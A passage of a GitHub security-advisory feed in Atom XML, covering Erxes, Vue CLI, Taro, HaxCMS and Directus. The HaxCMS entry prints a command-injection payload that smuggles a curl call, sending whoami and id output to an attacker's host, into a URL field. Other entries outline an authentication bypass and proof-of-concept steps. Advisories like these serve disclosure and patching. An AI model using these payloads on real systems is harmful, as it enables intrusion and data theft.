<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5891">https://nvd.nist.gov/vuln/detail/CVE-2025-5891</a></li>
<li><a href="https://github.com/Unitech/pm2/pull/5971">https://github.com/Unitech/pm2/pull/5971</a></li>
<li><a href="https://gist.github.com/mmmsssttt404/407e2ffe3e0eaa393ad923a86316a385">https://gist.github.com/mmmsssttt404/407e2ffe3e0eaa393ad923a86316a385</a></li>
<li><a href="https://vuldb.com/?ctiid.311662">https://vuldb.com/?ctiid.311662</a></li>
<li><a href="https://vuldb.com/?id.311662">https://vuldb.com/?id.311662</a></li>
<li><a href="https://vuldb.com/?submit.585750">https://vuldb.com/?submit.585750</a></li>
<li><a href="https://github.com/advisories/GHSA-x5gf-qvw8-r2rm">https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-09T21:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[erxes] Erxes Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rq9r-qvwg-829q</id>
        <link href="https://github.com/advisories/GHSA-rq9r-qvwg-829q"/>
        <updated>2025-06-10T20:27:02.000Z</updated>
        <content type="html"><![CDATA[<p>In Erxes &lt;1.6.2, an unauthenticated attacker can read arbitrary files from the system using a Path Traversal vulnerability in the /read-file endpoint handler.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57186">https://nvd.nist.gov/vuln/detail/CVE-2024-57186</a></li>
<li><a href="https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3">https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3</a></li>
<li><a href="https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices">https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices</a></li>
<li><a href="https://github.com/advisories/GHSA-rq9r-qvwg-829q">https://github.com/advisories/GHSA-rq9r-qvwg-829q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rq9r-qvwg-829q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-10T18:32:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[erxes] Erxes Incorrect Access Control vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7rhv-xm4q-wh42</id>
        <link href="https://github.com/advisories/GHSA-7rhv-xm4q-wh42"/>
        <updated>2025-06-10T20:26:41.000Z</updated>
        <content type="html"><![CDATA[<p>Erxes &lt;1.6.1 is vulnerable to Incorrect Access Control. An attacker can bypass authentication by providing a "User" HTTP header that contains any user, allowing them to talk to any GraphQL endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57190">https://nvd.nist.gov/vuln/detail/CVE-2024-57190</a></li>
<li><a href="https://github.com/erxes/erxes/commit/4ed2ca797241d2ba0c9083feeadd9755c1310ce8">https://github.com/erxes/erxes/commit/4ed2ca797241d2ba0c9083feeadd9755c1310ce8</a></li>
<li><a href="https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices">https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices</a></li>
<li><a href="https://github.com/advisories/GHSA-7rhv-xm4q-wh42">https://github.com/advisories/GHSA-7rhv-xm4q-wh42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rhv-xm4q-wh42</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-10T18:32:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[erxes] Erxes Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2977-5php-6789</id>
        <link href="https://github.com/advisories/GHSA-2977-5php-6789"/>
        <updated>2025-06-10T20:25:50.000Z</updated>
        <content type="html"><![CDATA[<p>In Erxes &lt;1.6.2, an authenticated attacker can write to arbitrary files on the system using a Path Traversal vulnerability in the importHistoriesCreate GraphQL mutation handler.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57189">https://nvd.nist.gov/vuln/detail/CVE-2024-57189</a></li>
<li><a href="https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3">https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3</a></li>
<li><a href="https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices">https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices</a></li>
<li><a href="https://github.com/advisories/GHSA-2977-5php-6789">https://github.com/advisories/GHSA-2977-5php-6789</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2977-5php-6789</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-10T18:32:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@vue/cli-plugin-pwa] @vue/cli-plugin-pwa Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-79vf-hf9f-j9q8</id>
        <link href="https://github.com/advisories/GHSA-79vf-hf9f-j9q8"/>
        <updated>2025-06-09T23:10:43.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in vuejs vue-cli up to 5.0.8. It has been rated as problematic. This issue affects the function HtmlPwaPlugin of the file packages/@vue/cli-plugin-pwa/lib/HtmlPwaPlugin.js of the component Markdown Code Handler. The manipulation leads to inefficient regular expression complexity. The attack may be initiated remotely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5897">https://nvd.nist.gov/vuln/detail/CVE-2025-5897</a></li>
<li><a href="https://github.com/vuejs/vue-cli/pull/7478">https://github.com/vuejs/vue-cli/pull/7478</a></li>
<li><a href="https://vuldb.com/?ctiid.311669">https://vuldb.com/?ctiid.311669</a></li>
<li><a href="https://vuldb.com/?id.311669">https://vuldb.com/?id.311669</a></li>
<li><a href="https://vuldb.com/?submit.585798">https://vuldb.com/?submit.585798</a></li>
<li><a href="https://github.com/advisories/GHSA-79vf-hf9f-j9q8">https://github.com/advisories/GHSA-79vf-hf9f-j9q8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79vf-hf9f-j9q8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-09T21:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[taro-css-to-react-native] taro-css-to-react-native Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f5xg-cfpj-2mw6</id>
        <link href="https://github.com/advisories/GHSA-f5xg-cfpj-2mw6"/>
        <updated>2025-06-09T23:08:48.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in tarojs taro up to 4.1.1. It has been declared as problematic. This vulnerability affects unknown code of the file taro/packages/css-to-react-native/src/index.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. Upgrading to version 4.1.2 is able to address this issue. The name of the patch is c2e321a8b6fc873427c466c69f41ed0b5e8814bf. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5896">https://nvd.nist.gov/vuln/detail/CVE-2025-5896</a></li>
<li><a href="https://github.com/NervJS/taro/pull/17619">https://github.com/NervJS/taro/pull/17619</a></li>
<li><a href="https://github.com/NervJS/taro/commit/c2e321a8b6fc873427c466c69f41ed0b5e8814bf">https://github.com/NervJS/taro/commit/c2e321a8b6fc873427c466c69f41ed0b5e8814bf</a></li>
<li><a href="https://github.com/NervJS/taro/releases/tag/v4.1.2">https://github.com/NervJS/taro/releases/tag/v4.1.2</a></li>
<li><a href="https://vuldb.com/?ctiid.311668">https://vuldb.com/?ctiid.311668</a></li>
<li><a href="https://vuldb.com/?id.311668">https://vuldb.com/?id.311668</a></li>
<li><a href="https://vuldb.com/?submit.585796">https://vuldb.com/?submit.585796</a></li>
<li><a href="https://github.com/advisories/GHSA-f5xg-cfpj-2mw6">https://github.com/advisories/GHSA-f5xg-cfpj-2mw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f5xg-cfpj-2mw6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-09T21:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HaxCMS-PHP Command Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-g4cf-pp4x-hqgw</id>
        <link href="https://github.com/advisories/GHSA-g4cf-pp4x-hqgw"/>
        <updated>2025-06-09T21:44:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The 'gitImportSite' functionality obtains a URL string from a POST request and insufficiently validates user input. The ’set_remote’ function later passes this input into ’proc_open’, yielding OS command injection.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in the logic of the ’gitImportSite’ function, located in ’Operations.php’. The current implementation only relies on the ’filter_var’ and 'strpos' functions to validate the URL, which is not sufficient to ensure absence of all Bash special characters used for command injection.
<img alt="gitImportSite" src="https://github.com/user-attachments/assets/af9935ef-4735-446d-833f-2c2590ff1508"></p>
<h4 id="affected-resources">Affected Resources</h4>
<p>• Operations.php:2103 gitImportSite()
• &lt;domain&gt;/&lt;user&gt;/system/api/gitImportSite</p>
<h3 id="poc">PoC</h3>
<p>To replicate this vulnerability, authenticate and send a POST request to the 'gitImportSite' endpoint with a crafted URL in the JSON data. Note, a valid token needs to be obtained by capturing a request to another API endpoint (such as 'archiveSite').</p>
<ol>
<li><p>Start a webserver.
<img alt="webserver" src="https://github.com/user-attachments/assets/8594f9b1-67fa-4352-bbc3-310bb164ec9b"></p>
</li>
<li><p>Initiate a request to the ’archiveSite’ endpoint.
<img alt="archiveSite" src="https://github.com/user-attachments/assets/08503f36-d984-4d53-8fe6-577ad78d5eb7"></p>
</li>
<li><p>Capture and modify the request in BurpSuite.
<img alt="request-modification" src="https://github.com/user-attachments/assets/61cd211e-afd3-453e-b86b-58bccffaf824"></p>
</li>
<li><p>Observe command output in the HTTP request from the server.
<img alt="command-output" src="https://github.com/user-attachments/assets/35f32274-b709-41d5-adaa-bea48f5cf33c"></p>
</li>
</ol>
<h4 id="command-injection-payload">Command Injection Payload</h4>
<pre><code class="language-Bash">http://&lt;IP&gt;/.git;curl${IFS}&lt;IP&gt;/$(whoami)/$(id)#=abcdef
</code></pre>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker can craft a URL string that bypasses the validation checks employed by the ’filter_var’ and ’strpos’ functions in order to execute arbitrary OS commands on the backend server. The attacker can exfiltrate command output via an HTTP request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw">https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw</a></li>
<li><a href="https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3">https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49141">https://nvd.nist.gov/vuln/detail/CVE-2025-49141</a></li>
<li><a href="https://github.com/advisories/GHSA-g4cf-pp4x-hqgw">https://github.com/advisories/GHSA-g4cf-pp4x-hqgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4cf-pp4x-hqgw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-09T20:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] @haxtheweb/haxcms-nodejs Iframe Phishing vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v3ph-2q5q-cg88</id>
        <link href="https://github.com/advisories/GHSA-v3ph-2q5q-cg88"/>
        <updated>2025-06-09T21:44:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In the HAX site editor, users can create a website block to load another site in an iframe. The application allows users to supply a target URL in the website block. When the HAX site is visited, the client's browser will query the supplied URL.</p>
<h3 id="affected-resources">Affected Resources</h3>
<ul>
<li><a href="https://github.com/haxtheweb/haxcms-php/blob/master/system/backend/php/lib/Operations.php#L868">Operations.php:868</a></li>
<li><code>https://&lt;site&gt;/&lt;user&gt;/system/api/saveNode</code></li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Set the URL in an iframe pointing to an attacker-controlled server running Responder</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/baac23ec-7b1e-49cf-864d-c3550b2c71bf"></p>
<ol start="2">
<li>Once another user visits the site, they are prompted to sign in.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/a3a0b75d-e12f-49cf-8669-9686353a92e2"></p>
<ol start="3">
<li>If a user inputs credentials, the username and password hash are outputted in Responder.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/428542d3-8cf5-4bfa-b759-e630c3ee6ac3"></p>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker can create a HAX site with a website block pointing at an attacker-controlled server running Responder or a similar tool. The attacker can then conduct a phishing attack by convincing another user to visit their malicious HAX site to harvest credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-v3ph-2q5q-cg88">https://github.com/haxtheweb/issues/security/advisories/GHSA-v3ph-2q5q-cg88</a></li>
<li><a href="https://github.com/haxtheweb/haxcms-nodejs/commit/5368eb9b278ca47cd9a83b8d3e6216375615b8f5">https://github.com/haxtheweb/haxcms-nodejs/commit/5368eb9b278ca47cd9a83b8d3e6216375615b8f5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49139">https://nvd.nist.gov/vuln/detail/CVE-2025-49139</a></li>
<li><a href="https://github.com/advisories/GHSA-v3ph-2q5q-cg88">https://github.com/advisories/GHSA-v3ph-2q5q-cg88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3ph-2q5q-cg88</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-09T19:07:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/types] Suspended Directus user can continue to use session token to access API]]></title>
        <id>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</id>
        <link href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g"/>
        <updated>2025-06-09T18:12:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>
<h3 id="details">Details</h3>
<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>Create an active user</li>
<li>Log in with that user and note the session cookie</li>
<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>
<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>This weakens the security of suspending users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>
<li><a href="https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30351">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>
<li><a href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-26T18:30:43.000Z</published>
    </entry>
</feed>